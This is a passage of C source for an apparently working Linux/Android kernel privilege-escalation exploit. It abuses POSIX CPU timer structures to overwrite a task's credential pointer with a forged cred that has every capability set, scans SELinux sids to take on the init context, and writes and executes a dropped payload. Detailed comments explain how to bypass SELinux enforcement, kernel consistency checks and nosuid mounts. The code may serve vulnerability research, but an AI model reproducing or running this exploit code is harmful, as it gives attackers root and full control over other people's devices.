			(void)syscall(SYS_write, wfd, &err, sizeof(err));
			(void)syscall(SYS_exit, 0);
		}
		map = (void *)syscall(SYS_mmap, 0UL, IC_IORING_BLOCK,
				      PROT_READ | PROT_WRITE, MAP_SHARED, fd,
				      IC_IORING_OFF_SQ_RING);
		if (map == MAP_FAILED) {
			err = errno;
			(void)syscall(SYS_write, wfd, &err, sizeof(err));
			(void)syscall(SYS_exit, 0);
		}
		(void)syscall(SYS_write, wfd, "K", 1);
		(void)syscall(SYS_exit, 0);
	}
	(void)syscall(SYS_write, 2, "o", 1);
	if (!use_mem && g_drop_mode != 4) {
		in = (int)syscall(SYS_openat, AT_FDCWD, g_peak_scan_exec,
				  O_RDONLY | O_CLOEXEC, 0L);
		if (in < 0) {
			err = errno;
			goto fail;
		}
	}
	(void)syscall(SYS_write, 2, "1", 1);
	out = (int)syscall(SYS_openat, AT_FDCWD, path,
			   O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0755L);
	if (out < 0) {
		err = errno;
		if (in >= 0)
			(void)syscall(SYS_close, in);
		goto fail;
	}
	(void)syscall(SYS_write, 2, "2", 1);
	if (g_drop_mode == 0) {
		(void)syscall(SYS_write, 2, "w", 1);
		(void)syscall(SYS_write, wfd, &zero, sizeof(zero));
		(void)syscall(SYS_exit, 0);
	}
	if (g_drop_mode == 1) {
		(void)syscall(SYS_write, out, "x", 1);
		(void)syscall(SYS_write, 2, "a", 1);
		if (in >= 0)
			(void)syscall(SYS_close, in);
		(void)syscall(SYS_write, 2, "b", 1);
		(void)syscall(SYS_close, out);
		(void)syscall(SYS_write, 2, "c", 1);
		(void)syscall(SYS_write, wfd, &zero, sizeof(zero));
		(void)syscall(SYS_write, 2, "w", 1);
		(void)syscall(SYS_exit, 0);
	}
	if (g_drop_mode == 2 && in >= 0) {
		n = syscall(SYS_read, in, buf, 4096L);
		if (n < 0) {
			err = errno;
			goto closefail;
		}
		if (n > 0) {
			w = syscall(SYS_write, out, buf, (size_t)n);
			if (w != n) {
				err = errno;
				goto closefail;
			}
		}
		(void)syscall(SYS_close, in);
		(void)syscall(SYS_close, out);
		(void)syscall(SYS_write, wfd, &zero, sizeof(zero));
		(void)syscall(SYS_exit, 0);
	}
	/* Mode 4: the payload is a shebang script, not the image.  Under
	 * enforcement file:execute_no_trans is denied to init on system_file,
	 * but 6.1 applies that check to the initial program (this script,
	 * adb_data_file -> allow) while the interpreter only needs
	 * file:execute on system_file (allow).  binfmt_script replaces argv[0]
	 * with the interpreter, so the copied image is reached with its own
	 * path and IC_SCAN_FD in the environment. */
	if (g_drop_mode == 4) {
		const char *ip = g_peak_interp_path && *g_peak_interp_path
			? g_peak_interp_path : "/tmp/ic-interp";
		char sbuf[160];
		int sl = snprintf(sbuf, sizeof(sbuf), "#!%s\n", ip);

		if (sl <= 2 || sl >= (int)sizeof(sbuf)) {
			err = ENAMETOOLONG;
			goto closefail;
		}
		w = syscall(SYS_write, out, sbuf, (size_t)sl);
		if (w != sl) {
			err = errno;
			goto closefail;
		}
		(void)syscall(SYS_close, out);
		(void)syscall(SYS_fchmodat, AT_FDCWD, path, 0755L, 0L);
		(void)syscall(SYS_write, 2, "4", 1);
		(void)syscall(SYS_execve, path, argv, envp);
		(void)syscall(SYS_write, 2, "5", 1);
		err = errno;
		goto fail;
	}
	if (use_mem) {
		while (done < g_self_len) {
			size_t chunk = g_self_len - done;

			if (chunk > sizeof(buf))
				chunk = sizeof(buf);
			n = syscall(SYS_write, out, g_self_blob + done,
				    chunk);
			if (n <= 0) {
				err = errno;
				goto closefail;
			}
			done += (size_t)n;
		}
	} else {
		for (;;) {
			n = syscall(SYS_read, in, buf, sizeof(buf));
			if (n == 0)
				break;
			if (n < 0) {
				err = errno;
				goto closefail;
			}
			for (off = 0; off < (size_t)n; off += (size_t)w) {
				w = syscall(SYS_write, out, buf + off,
					    (size_t)n - off);
				if (w <= 0) {
					err = errno;
					goto closefail;
				}
			}
		}
	}
	(void)syscall(SYS_close, out);
	if (in >= 0)
		(void)syscall(SYS_close, in);
	(void)syscall(SYS_write, 2, "3", 1);
	(void)syscall(SYS_fchmodat, AT_FDCWD, path, 0755L, 0L);
	(void)syscall(SYS_write, 2, "4", 1);
	(void)syscall(SYS_execve, path, argv, envp);
	(void)syscall(SYS_write, 2, "5", 1);
	err = errno;
	goto fail;
closefail:
	if (in >= 0)
		(void)syscall(SYS_close, in);
	(void)syscall(SYS_close, out);
fail:
	(void)syscall(SYS_write, wfd, &err, sizeof(err));
	(void)syscall(SYS_exit, 0);
}

/* 1 = the payload answered 'K' after exec, 0 = answered otherwise,
 * -1 = no answer in time.  mode 1 writes one byte to a new file, mode 2
 * copies 4 KiB, mode 3 copies the whole image, chmods and execs. */
static int ic_peak_drop_try(unsigned int sid, const char *path, int mode)
{
	struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
	struct pollfd pfd;
	unsigned int v = 0;
	long pid;
	int fds[2];
	ssize_t n;
	int ret = 0;
	int pid_reaped = 0;

	g_drop_mode = mode;
	ic_peak_store_sid(sid);
	if (syscall(SYS_pipe2, fds, 0))
		return 0;
	snprintf(g_scan_ack_env, sizeof(g_scan_ack_env), "IC_SCAN_FD=%d",
		 fds[1]);
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);
	if (pid < 0) {
		(void)syscall(SYS_close, fds[0]);
		(void)syscall(SYS_close, fds[1]);
		return 0;
	}
	if (!pid)
		ic_peak_drop_child(fds[0], fds[1], path);
	(void)syscall(SYS_close, fds[1]);

	if (getenv("IC_DROP_DIAG")) {
		char pbuf[64], dbuf[160];
		ssize_t r;
		int dfd;

		fprintf(stderr, "[drop] child pid=%ld mode=%d\n", pid, mode);
		fflush(stderr);
		usleep(100000);
		snprintf(pbuf, sizeof(pbuf), "/proc/%ld/stat", pid);
		dfd = open(pbuf, O_RDONLY | O_CLOEXEC);
		if (dfd >= 0) {
			r = read(dfd, dbuf, sizeof(dbuf) - 1);
			close(dfd);
			if (r > 0) {
				dbuf[r] = '\0';
				fprintf(stderr, "[drop] stat %s\n", dbuf);
				fflush(stderr);
			}
		}
		{
			int st = 0;
			long wr = syscall(SYS_wait4, pid, &st, WNOHANG, NULL);

			fprintf(stderr, "[drop] wait4=%ld status=0x%x\n", wr, st);
			fflush(stderr);
			if (wr == pid)
				pid_reaped = 1;
		}
		snprintf(pbuf, sizeof(pbuf), "/proc/%ld/stack", pid);
		dfd = open(pbuf, O_RDONLY | O_CLOEXEC);
		if (dfd >= 0) {
			r = read(dfd, dbuf, sizeof(dbuf) - 1);
			close(dfd);
			if (r > 0) {
				dbuf[r] = '\0';
				fprintf(stderr, "[drop] stack %s\n", dbuf);
				fflush(stderr);
			}
		}
	}

	pfd.fd = fds[0];
	pfd.events = POLLIN;
	pfd.revents = 0;
	for (;;) {
		long pr = syscall(SYS_ppoll, &pfd, 1UL, &ts, NULL, 0);

		if (pr < 0 && errno == EINTR)
			continue;
		if (pr <= 0) {
			(void)syscall(SYS_kill, pid, SIGKILL);
			if (!pid_reaped)
				(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
			(void)syscall(SYS_close, fds[0]);
			return -1;
		}
		break;
	}
	n = syscall(SYS_read, fds[0], &v, sizeof(v));
	(void)syscall(SYS_close, fds[0]);
	if (!pid_reaped)
		(void)syscall(SYS_wait4, pid, NULL, 0, NULL);
	if (n >= 1 && (v & 0xffu) == 'K')
		ret = 1;
	else if (n >= 4)
		ic_logf("[drop] mode=%d errno=%d\n", mode,
			(int)(v & 0xffffu));
	else
		ic_logf("[drop] mode=%d short answer\n", mode);
	return ret;
}

/* Runs under the discovered sid.  With IC_DROP_SEQ the three stages run in
 * order so a stall can be localized: create one byte, copy 4 KiB, then the
 * full copy+chmod+exec; only the last can report 'K'.  Returns 1 when the
 * payload acknowledged after exec. */
static int ic_peak_drop_exec(unsigned int sid)
{
	char path[96];
	char name[16];
	int mode, rc = 0;

	if (!g_peak_drop_dir || !*g_peak_drop_dir || !g_peak_scan_exec)
		return 0;
	snprintf(path, sizeof(path), "%s/payload", g_peak_drop_dir);
	if (getenv("IC_DROP_SEQ")) {
		for (mode = 0; mode <= 3; mode++) {
			rc = ic_peak_drop_try(sid, path, mode);
			ic_logf("[drop] sid=%u mode=%d rc=%d\n", sid, mode,
				rc);
			if (rc < 0)
				break;
		}
	} else {
		const char *dm = getenv("IC_DROP_MODE");

		rc = ic_peak_drop_try(sid, path, dm ? atoi(dm) : 3);
	}
	if (rc == 1) {
		snprintf(name, sizeof(name), "drop-%u", sid);
		(void)prctl(PR_SET_NAME, name, 0UL, 0UL, 0UL);
		(void)syscall(SYS_write, 2, "D", 1);
		ic_logf("[drop] sid=%u created %s and exec'd it\n", sid, path);
	}
	return rc == 1;
}

/* The numeric sid of a context is never exported to user space, but a
 * forked child can ask /proc/self/attr/current for the *string* its own
 * sid resolves to.  Walk the sidtab range, point the fake cred at each
 * sid and read the name back, then keep the target sid in place.  On the
 * device this turns "which sid is u:r:init:s0?" into a syscall loop
 * instead of a policy probe.  The target context must already have a
 * sidtab entry: the harness interns it at boot (ic_intern=), and on the
 * device ic_peak_intern_ctx() gets one via a denied attr/exec write.
 * Only the winner's cred is fake, so the rest of the process is
 * unaffected while the word is moved. */
static int ic_peak_ctxmap_scan(void)
{
	unsigned int nel = ic_peak_sid_count();
	unsigned int max = g_peak_scan_max;
	const char *want = g_peak_ctxmap_target;
	int found = -1;
	unsigned int sid;

	if (!max)
		max = nel ? 28 + nel + 64 : IC_SCAN_DEFAULT_MAX;
	ic_logf("[ctxmap] sids 0..%u target=%s\n", max,
		want && *want ? want : "(none)");
	for (sid = 0; sid <= max; sid++) {
		char ctx[128];
		int rc;

		rc = ic_peak_ctxmap_one(sid, ctx, sizeof(ctx));
		if (rc <= 0)
			continue;
		if (g_peak_scan_all)
			ic_logf("[ctxmap] %u %s\n", sid, ctx);
		if (found < 0 && want && *want && !strcmp(ctx, want))
			found = (int)sid;
	}
	if (found >= 0) {
		ic_peak_store_sid((unsigned int)found);
		g_scan_hit_sid = (unsigned int)found;
		ic_logf("[ctxmap] %s = sid %d\n", want, found);
		ic_peak_report_hit();
	} else {
		ic_logf("[ctxmap] target not found up to %u\n", max);
	}
	return found;
}

static void ic_child_write(const char *s, size_t n)
{
	(void)syscall(SYS_write, 2, s, n);
}

static size_t ic_child_u32(char *out, unsigned int v)
{
	char tmp[10];
	size_t n = 0, i = 0;

	do {
		tmp[n++] = (char)('0' + v % 10);
		v /= 10;
	} while (v);
	while (n)
		out[i++] = tmp[--n];
	return i;
}

/* Runs in a freshly cloned child of the winner: raw syscalls only, so no
 * libc lock inherited from the other threads can deadlock it. */
static void ic_fork_child_probe(void)
{
	unsigned int ruid = 0, euid = 0, suid = 0;
	char buf[48];
	size_t n;
	int fd;
	char c;

	(void)syscall(SYS_getresuid, &ruid, &euid, &suid);
	ic_child_write("[fork-child] resuid=", 20);
	n = ic_child_u32(buf, ruid);
	buf[n++] = '/';
	n += ic_child_u32(buf + n, euid);
	buf[n++] = '/';
	n += ic_child_u32(buf + n, suid);
	buf[n++] = '\n';
	ic_child_write(buf, n);

	/* Positive control: 0400 root-owned file.  fsuid 0 makes us the DAC
	 * owner, so this needs no capability. */
	fd = (int)syscall(SYS_openat, AT_FDCWD, "/ic-proof-root",
			  O_RDONLY | O_CLOEXEC, 0);
	if (fd >= 0 && syscall(SYS_read, fd, &c, 1) == 1 && c == 'R')
		ic_child_write("[fork-child] root-only read ok\n", 32);
	else
		ic_child_write("[fork-child] root-only read FAILED\n", 36);
	if (fd >= 0)
		(void)syscall(SYS_close, fd);

	/* Negative control: 0600 file owned by uid 1000.  fsuid 0 is not the
	 * owner, so generic_permission() calls in_group_p(), which walks the
	 * fake group_info.  It must report EACCES, not fault. */
	fd = (int)syscall(SYS_openat, AT_FDCWD, "/ic-proof-shell",
			  O_RDONLY | O_CLOEXEC, 0);
	if (fd >= 0) {
		(void)syscall(SYS_close, fd);
		ic_child_write("[fork-child] group-path UNEXPECTEDLY opened\n",
			       44);
	} else {
		ic_child_write("[fork-child] group-path denied as expected\n",
			       44);
	}

	/* The device mounts /data nosuid, so the payload must not rely on the
	 * 04755 bit.  Exec a plain 0755 copy from a nosuid tmpfs: exec keeps
	 * euid 0 and, via handle_privileged_root() (euid == 0), refills
	 * cap_permitted from cap_bset and sets effective. */
	{
		char *const argv[] = { (char *)"timer-poc", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin:/sbin:/vendor/bin",
				       NULL };

		(void)syscall(SYS_execve, "/tmp/ic-exec-helper", argv, envp);
		ic_child_write("[fork-child] exec helper FAILED\n", 32);
	}
	(void)syscall(SYS_exit, 0);
}

/* The winner's task->cred is the in-page fake while task->real_cred is still
 * the original, so commit_creds() (exec, setuid) would trip
 * BUG_ON(task->cred != task->real_cred).  copy_creds() does not: a forked
 * child gets a real cred pair whose fields were copied from the fake, and
 * copy_process() re-initialises its posix_cputimers, so it does not inherit
 * the winner's bogus cached rb_leftmost either. */
static void ic_peak_fork_helper(void)
{
	long pid;

	if (g_peak_trace)
		ic_child_write("[fork] enter\n", 13);
	pid = syscall(SYS_clone, SIGCHLD, 0UL, 0UL, 0UL, 0UL);

	if (pid < 0) {
		ic_child_write("[fork] clone failed\n", 20);
		return;
	}
	if (!pid)
		ic_fork_child_probe();
	atomic_store_explicit(&g_poc_success, 1, memory_order_release);
	ic_futex_wake_priv(&g_poc_success, 1);
}

static void *ic_peak_worker_main(void *opaque)
{
	struct ic_peak_worker *w = opaque;
	unsigned int tries;

	ic_pin_cpu_index(1 + w->index % 3);
	atomic_store_explicit(&w->tid, (int)ic_raw_gettid(),
			      memory_order_release);
	atomic_store_explicit(&w->ready, 1, memory_order_release);
	ic_futex_wake_priv(&w->ready, 1);

	/* Userspace only from here until the release flag: a syscall while
	 * task->cred points at an unfilled page would read garbage. */
	while (!atomic_load_explicit(&g_peak_release, memory_order_acquire)) {
		for (volatile unsigned int i = 0; i < 256; i++)
			ic_cpu_relax();
	}

	/* Raw syscalls only from here on: the winner's cred may point at the
	 * fake page, so no libc path that could take a lock. */
	if (g_peak_trace) {
		char b[12];
		size_t n;

		ic_child_write("[w]", 3);
		n = ic_child_u32(b, w->index);
		ic_child_write(b, n);
		ic_child_write(" euid=", 6);
		n = ic_child_u32(b, (unsigned int)syscall(SYS_geteuid));
		ic_child_write(b, n);
		ic_child_write("\n", 1);
	}

	/* Only the winner's cred was replaced.  Its euid reads 0 and its uid
	 * reads as the top half of the in-page self-pointer (0xffffffXX),
	 * which no normal task can have; in the harness's root mode euid 0
	 * alone would match every worker.  It must not exec or setuid
	 * (commit_creds would BUG_ON real_cred != cred), so it forks a child
	 * that inherits a coherent copy of the fake cred.  The other workers
	 * just fail to find a root-owned file and park. */
	if (g_peak_scan_mode) {
		if ((unsigned int)syscall(SYS_getuid) ==
		    atomic_load_explicit(&g_peak_fake_uid,
					 memory_order_relaxed)) {
			if (g_peak_ctxmap) {
				int fs = ic_peak_ctxmap_scan();

				if (fs >= 0 &&
				    ic_peak_drop_exec((unsigned int)fs) &&
				    g_scan_exit_after_drop) {
					/* The drop child has already exited (the
					 * payload acks before it runs anything
					 * long-lived), so main can return and
					 * let the harness power off; this
					 * process is then parked in the launcher
					 * child, which keeps the psl armed. */
					fprintf(stderr, "[drop] sid=%d done, "
						"reporting success\n", fs);
					fflush(stderr);
					atomic_store_explicit(&g_poc_success, 1,
							      memory_order_release);
					ic_futex_wake_priv(&g_poc_success, 1);
				}
			} else {
				ic_peak_sid_scan();
			}
		}
	} else if (g_peak_fork_helper) {
		if ((unsigned int)syscall(SYS_geteuid) == 0)
			ic_peak_fork_helper();
	} else {
		for (tries = 0; tries < 4; tries++) {
			if (ic_do_escalate()) {
				fprintf(stderr, "[peak] worker %u escalated\n",
					w->index);
				fflush(stderr);
				break;
			}
			usleep(2000);
		}
	}
	for (;;)
		pause();
	return NULL;
}

static int ic_peak_setup_workers(void)
{
	const char *env = getenv("IC_PEAK_WORKERS");
	unsigned int want = IC_PEAK_DEFAULT_WORKERS;
	pthread_attr_t attr;
	sigset_t set;
	unsigned int i;

	if (env) {
		unsigned long v = strtoul(env, NULL, 0);

		if (v && v <= IC_PEAK_MAX_WORKERS)
			want = (unsigned int)v;
	}
	sigemptyset(&set);
	sigaddset(&set, IC_SIGEV_SIGNO);
	sigaddset(&set, IC_EXEC_SIGNO);
	if (pthread_sigmask(SIG_BLOCK, &set, NULL))
		return -1;
	if (pthread_attr_init(&attr))
		return -1;
	if (pthread_attr_setstacksize(&attr, 64 * 1024) ||
	    pthread_attr_setguardsize(&attr, 0)) {
		pthread_attr_destroy(&attr);
		return -1;
	}
	for (i = 0; i < want; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];

		memset(w, 0, sizeof(*w));
		w->index = i;
		w->candidate = -1;
		w->trigger = -1;
		if (pthread_create(&w->thread, &attr, ic_peak_worker_main, w))
			break;
		g_peak_count = i + 1;
	}
	pthread_attr_destroy(&attr);
	if (!g_peak_count)
		return -1;
	for (i = 0; i < g_peak_count; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];
		unsigned int spins = 0;

		while (!atomic_load_explicit(&w->ready, memory_order_acquire) &&
		       spins < 20000) {
			usleep(500);
			spins++;
		}
		if (!atomic_load_explicit(&w->ready, memory_order_acquire))
			return -1;
		if (pthread_getcpuclockid(w->thread, &w->clockid))
			return -1;
	}
	fprintf(stderr, "[peak] %u workers ready\n", g_peak_count);
	return 0;
}

static int ic_peak_create_candidates(void)
{
	struct sigevent ev;
	struct itimerspec its;
	unsigned int i;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_SIGNAL;
	ev.sigev_signo = IC_SIGEV_SIGNO;
	ev.sigev_value.sival_int = 0x504b;
	memset(&its, 0, sizeof(its));
	its.it_value.tv_sec = 3600;
	for (i = 0; i < g_peak_count; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];

		if (syscall(SYS_timer_create, w->clockid, &ev, &w->candidate))
			return -1;
		w->candidate_live = 1;
		if (syscall(SYS_timer_settime, w->candidate, 0, &its, NULL))
			return -1;
	}
	return 0;
}

static void ic_peak_delete_candidates(void)
{
	unsigned int i;

	for (i = 0; i < g_peak_count; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];

		if (!w->candidate_live)
			continue;
		(void)syscall(SYS_timer_delete, w->candidate);
		w->candidate_live = 0;
	}
}

static int ic_peak_create_triggers(void)
{
	struct sigevent ev;
	unsigned int i;

	memset(&ev, 0, sizeof(ev));
	ev.sigev_notify = SIGEV_NONE;
	for (i = 0; i < g_peak_count; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];

		if (syscall(SYS_timer_create, w->clockid, &ev, &w->trigger)) {
			fprintf(stderr, "[peak] trigger create %u/%u errno=%d\n",
				i, g_peak_count, errno);
			return -1;
		}
		w->trigger_live = 1;
	}
	return 0;
}

/* One shot only: after the collect has run, a second settime(0) would arm a
 * fresh collect against the rewritten tree (leftmost now X+0x10). */
static void ic_peak_fire_triggers(void)
{
	struct itimerspec zero;
	unsigned int i;

	memset(&zero, 0, sizeof(zero));
	for (i = 0; i < g_peak_count; i++) {
		struct ic_peak_worker *w = &g_peak_workers[i];

		if (w->trigger_live)
			(void)syscall(SYS_timer_settime, w->trigger, 0, &zero,
				      NULL);
	}
}

static uint64_t ic_peak_load64(const volatile void *p)
{
	return __atomic_load_n((const volatile uint64_t *)p, __ATOMIC_ACQUIRE);
}

static void ic_peak_store64(volatile void *p, uint64_t v)
{
	__atomic_store_n((volatile uint64_t *)p, v, __ATOMIC_RELEASE);
}

static void ic_peak_write_stage1(volatile unsigned char *page, unsigned int off,
				 uint64_t x)
{
	uint64_t page_va = x & ~0xfffUL;
	uint64_t fake_head = page_va;
	/* Do not let the scratch area collide with the fields the erase and
	 * the firing loop actually use (node-0x58 .. node+0x50). */
	unsigned int scratch_off = off >= 0x90 ? 0x20 : 0x100;
	uint64_t scratch = page_va + scratch_off;
	volatile uint64_t *q = (volatile uint64_t *)(page + off);

	ic_peak_store64(page + 0, 0);	/* fake rb_root.rb_node */
	ic_peak_store64(page + 8, 0);	/* fake rb_leftmost */

	q[0] = scratch;		/* parent_color: fake parent = scratch */
	q[1] = 0;		/* rb_right */
	q[2] = x + 0x18;	/* rb_left = &node.expires */
	q[3] = 0;		/* expires: 0 -> due now */
	q[4] = fake_head;	/* ctmr->head = fake timerqueue_head */
	q[5] = 0;		/* pid */
	q[6] = 0;		/* elist.next */
	q[7] = 0;		/* elist.prev */
	*(volatile uint32_t *)(page + off + 0x40) = 0;	/* firing */
	q[9] = 0;					/* handling */
	*(volatile int32_t *)(page + off - 0x24) = 1;	/* SIGEV_NONE */
	*(volatile uint32_t *)(page + off - 0x58) = 1;	/* it_lock parked */
}

static void ic_peak_write_stage2(volatile unsigned char *page, unsigned int off,
				 uint64_t x, uint64_t winner)
{
	volatile uint64_t *q = (volatile uint64_t *)(page + off);

	q[0] = x + IC_PEAK_CRED_DELTA;	/* parent_color -> fake cred */
	q[1] = 0;			/* rb_right */
	q[2] = winner + OFF_TASK_CRED;	/* rb_left = &winner->cred */
	q[3] = 0;			/* expires */
	q[4] = winner + OFF_TASK_CPU_TIMER_HEAD; /* real SCHED tqhead */
	/* pid doubles as the expires of the node-shaped object at X+0x10,
	 * which is what collect iteration 2 would read after the erase
	 * moved the base's cached leftmost there.  U64_MAX parks it. */
	q[5] = ~0ULL;
	/* elist stays for the collect's list_add_tail; firing/handling belong
	 * to the collect.  Park this firing loop too, so the fake cred can be
	 * filled in while the winner sits in the kernel and never returns to
	 * userspace with a half-written cred. */
	*(volatile uint32_t *)(page + off - 0x58) = 1;	/* it_lock parked */
}

#define IC_PEAK_ZONE_NONE 0xffffffffU

/* Pick a 0x400 window of the leaked page for the fake kernel objects when
 * the spray only mapped this page (AIO rings are single 4K pages).  The
 * window must miss the node/cred/security slice the collect still uses and
 * the stage-1 scratch qword; the used slice is 0x118 bytes, so with four
 * candidate windows at least two are always free. */
static unsigned int ic_peak_zone_off(unsigned int off)
{
	unsigned int scratch_off = off >= 0x90 ? 0x20 : 0x100;
	unsigned int lo = off - 0x58;
	unsigned int hi = off + IC_PEAK_CRED_DELTA + IC_PEAK_CRED_SIZE;
	unsigned int z;

	for (z = 0; z < 0x1000; z += IC_FAKE_ZONE_SIZE) {
		if (z < hi && z + IC_FAKE_ZONE_SIZE > lo)
			continue;
		if (z < scratch_off + 8 && z + IC_FAKE_ZONE_SIZE > scratch_off)
			continue;
		return z;
	}
	return IC_PEAK_ZONE_NONE;
}

/* zone/zone_off select where the fake kernel objects live: either the whole
 * sibling 4K page of the order-1 block (zone_off == 0) or a window inside
 * the leaked page itself. */
static void ic_peak_fill_cred(volatile unsigned char *page, unsigned int off,
			      uint64_t x, volatile unsigned char *zone,
			      uint64_t zone_va, unsigned int zone_off)
{
	uint64_t page_va = x & ~0xfffUL;
	volatile unsigned char *cred = page + off + IC_PEAK_CRED_DELTA;
	/* Fake task_security_struct just below the node (still in the page):
	 * SELinux reads cred->security->sid at +4 on every file alloc. */
	unsigned int sec_off = off - 0x20;
	volatile unsigned char *sec = page + sec_off;
	volatile unsigned char *fake = zone + zone_off;
	uint64_t fake_va = zone_va + zone_off;
	unsigned int i;

	/* Only these fields are ever dereferenced; everything else stays
	 * zero. */
	for (i = 0; i < IC_FAKE_ZONE_SIZE; i++)
		zone[zone_off + i] = 0;
	/* user_namespace: cap_capable() walks init_user_ns (level 0) and asks
	 * "level <= cred->user_ns->level"; a huge level makes it deny at the
	 * root instead of following parent == NULL.  The uid/gid maps keep
	 * from_kuid()/make_kuid() on the fake namespace inside the page. */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0x00) = 1; /* uid_map */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0x10) = 1; /* extent */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0x48) = 1; /* gid_map */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0x58) = 1; /* extent */
	*(volatile uint64_t *)(fake + IC_FAKE_NS_OFF + 0xd8) = 0; /* parent */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0xe0) =
		0x7fffffffU;				/* level */
	*(volatile uint32_t *)(fake + IC_FAKE_NS_OFF + 0x104) =
		0x40000000U;				/* ns.count */
	*(volatile uint64_t *)(fake + IC_FAKE_NS_OFF + 0x210) =
		0;			/* ucounts: ends the rlimit walk */
	/* ucounts: count@0x1c is what get_ucounts() bumps; ns@0x10 points at
	 * the fake namespace above.  uid@0x18 must match cred->uid, which is
	 * the high half of the self-pointer at cred+0: fs/exec.c's
	 * set_cred_ucounts() then takes its early return instead of
	 * alloc_ucounts()ing a fresh (rlimit 0) ucounts, which later
	 * dec_rlimit_ucounts() would warn about. */
	*(volatile uint64_t *)(fake + IC_FAKE_UCOUNTS_OFF + 0x10) =
		fake_va + IC_FAKE_NS_OFF;
	*(volatile uint32_t *)(fake + IC_FAKE_UCOUNTS_OFF + 0x18) =
		(uint32_t)((x + IC_PEAK_CRED_DELTA) >> 32);
	*(volatile uint32_t *)(fake + IC_FAKE_UCOUNTS_OFF + 0x1c) =
		0x40000000U;
	/* user_struct: only __count is touched (get_uid/free_uid). */
	*(volatile uint32_t *)(fake + IC_FAKE_USER_OFF) = 0x40000000U;
	/* group_info: groups_search() with ngroups == 0 reports "not a member"
	 * without reading gid[]. */
	*(volatile uint32_t *)(fake + IC_FAKE_GI_OFF) = 0x40000000U;
	*(volatile uint32_t *)(fake + IC_FAKE_GI_OFF + 4) = 0;

	for (i = 0; i < IC_PEAK_CRED_SIZE; i++)
		cred[i] = 0;
	/* usage|uid as one word: the SCHED base's cached rb_leftmost is
	 * X+0x10 == this cred, so if the winner is ever killed, release_task()
	 * calls rb_next(&cred->usage) and rb_erase() on it.  Pointing the
	 * rb_node's __rb_parent_color at the node itself makes RB_EMPTY_NODE()
	 * true, so rb_next() returns NULL and the base ends up empty instead
	 * of dereferencing 0x10000008.  The cost is uid reading as the top
	 * half of a kernel address (0xffffff80); nothing in the chain uses
	 * cred->uid, only fsuid and the caps. */
	*(volatile uint64_t *)(cred + 0x00) = x + IC_PEAK_CRED_DELTA;
	*(volatile uint64_t *)(cred + 0x30) = ~0ULL;	/* cap_permitted */
	*(volatile uint64_t *)(cred + 0x38) = ~0ULL;	/* cap_effective */
	*(volatile uint64_t *)(cred + 0x40) = ~0ULL;	/* cap_bset */
	*(volatile uint64_t *)(cred + 0x48) = 0;	/* cap_ambient */

	for (i = 0; i < 0x18; i++)
		sec[i] = 0;
	/* osid (SECINITSID_KERNEL-ish) and sid; without a policy loaded the
	 * value is only copied, but it must be readable memory.  On a policy-
	 * enforcing target the sid has to name a domain the helper's file
	 * label grants execute to, so it can be overridden per target. */
	*(volatile uint32_t *)(sec + 0x00) = 1;
	*(volatile uint32_t *)(sec + 0x04) =
		g_peak_sid_override ? g_peak_sid_override : 1;
	*(volatile uint64_t *)(cred + 0x78) = page_va + sec_off; /* security */
	*(volatile uint64_t *)(cred + 0x80) =
		fake_va + IC_FAKE_USER_OFF;			/* user */
	*(volatile uint64_t *)(cred + 0x88) =
		fake_va + IC_FAKE_NS_OFF;			/* user_ns */
	*(volatile uint64_t *)(cred + 0x90) =
		fake_va + IC_FAKE_UCOUNTS_OFF;		/* ucounts */
	*(volatile uint64_t *)(cred + 0x98) =
		fake_va + IC_FAKE_GI_OFF;			/* group_info */
}

/* ---------------- mcast stage 2: park, release, erase --------------------
 *
 * Same two-stage chain as the AIO path, with the psl of block O as the
 * carrier instead of a user mapping:
 *   - P_base is written to every ordinal within +-40 of the hit.  It is
 *     identical in every 0x100 block, so the permuted block order inside
 *     SLUB's slab does not matter: whichever block the fake cred's pointers
 *     name, its bytes are there.  Block O itself stays out of this pass;
 *   - P_s1 goes to the hit ordinal and parks worker 0 in the firing loop
 *     (it_lock = 1); the collect writes `current` into the handling slot,
 *     which getsockopt() hands back as the task pointer;
 *   - P_s2 releases the worker and lets the next tick's collect erase the
 *     node against the real timerqueue head, which stores the fake cred
 *     address into winner->cred.
 * Any failure after P_s1 leaves a parked or fake-cred winner behind, so
 * g_mc.active tells the caller to hang the attempt instead of unwinding.
 */
static int ic_mc_chain(struct ic_mcast_hit *hit)
{
	unsigned char base[IC_MC_NC][16], s1[IC_MC_NC][16];
	unsigned char s2[IC_MC_NC][16], img[IC_MC_NC][16];
	const struct ic_mcast_case *cs;
	unsigned int l = (unsigned int)(hit->value & 0xffU);
	unsigned int oi = (unsigned int)((hit->value & 0x1fffU) >> 8);
	unsigned int n = hit->ordinal, total = ic_mc_total();
	unsigned int count = 0, k, lo, hi, i;
	uint64_t slab = hit->value & ~0x1fffUL;
	uint64_t cred, winner = 0, v = 0;
	struct timespec ts = { .tv_nsec = 500L * 1000L };
	int fd;
	unsigned int g;

	cs = ic_mc_case_for(l);
	if (!cs || cs->oi != oi || !total) {
		fprintf(stderr, "[mcast] L=0x%x O=%u: no case\n", l, oi);
		fflush(stderr);
		return -1;
	}
	if (n >= total) {
		fprintf(stderr, "[mcast] ordinal %u out of %u\n", n, total);
		return -1;
	}
	cred = slab + cs->cred_off;
	g_mc.cs = cs;
	g_mc.ord = n;
	g_mc.slab = slab;
	g_mc.cred = cred;
	fprintf(stderr,
		"[mcast] case L=0x%02x O=%u ord=%u/%u slab=0x%llx cred=0x%llx "
		"tsec=0x%llx c_lock=%u\n", l, oi, n, total,
		(unsigned long long)slab, (unsigned long long)cred,
		(unsigned long long)(slab + 0x100UL * oi + cs->sec),
		cs->c_lock);
	fflush(stderr);

	/* ---- uniform base pattern over the slab ---- */
